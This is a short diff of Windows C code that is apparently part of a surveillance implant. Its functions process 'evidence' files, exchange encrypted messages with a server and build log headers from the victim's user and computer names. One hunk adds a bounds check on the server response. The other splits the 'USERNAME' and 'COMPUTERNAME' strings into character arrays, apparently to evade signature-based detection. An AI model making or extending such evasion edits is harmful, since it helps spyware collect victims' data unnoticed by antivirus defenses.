@@ -95,7 +95,7 @@ VOID ProcessEvidenceFiles()
 							{
 								Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
 
-								if (*(PULONG)pResponseBuffer == PROTO_OK)
+								if (uResponseLen >= sizeof(DWORD) && *(PULONG)pResponseBuffer == PROTO_OK)
 									bFileSent = TRUE;
 								free(pResponseBuffer);
 							}
@@ -204,8 +204,11 @@ PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditio
 	memset(wHostName, 0x0, sizeof(wHostName));
 	wUserName[0]=L'-';
 	wHostName[0]=L'-';
-	GetEnvironmentVariable(L"USERNAME", (LPWSTR)wUserName, (sizeof(wUserName)/sizeof(WCHAR))-2);
-	GetEnvironmentVariable(L"COMPUTERNAME", (LPWSTR)wHostName, (sizeof(wHostName)/sizeof(WCHAR))-2);
+
+	WCHAR strUser[] = { L'U', L'S', L'E', L'R', L'N', L'A', L'M', L'E', L'\0' };
+	WCHAR strComputer[] = { L'C', L'O', L'M', L'P', L'U', L'T', L'E', L'R', L'N', L'A', L'M', L'E', L'\0' };
+	GetEnvironmentVariable(strUser, (LPWSTR)wUserName, (sizeof(wUserName)/sizeof(WCHAR))-2);
+	GetEnvironmentVariable(strComputer, (LPWSTR)wHostName, (sizeof(wHostName)/sizeof(WCHAR))-2);
 	GetSystemTimeAsFileTime(&uFileTime);
 
 	pLogHeader.uDeviceIdLen = wcslen(wHostName) * sizeof(WCHAR);
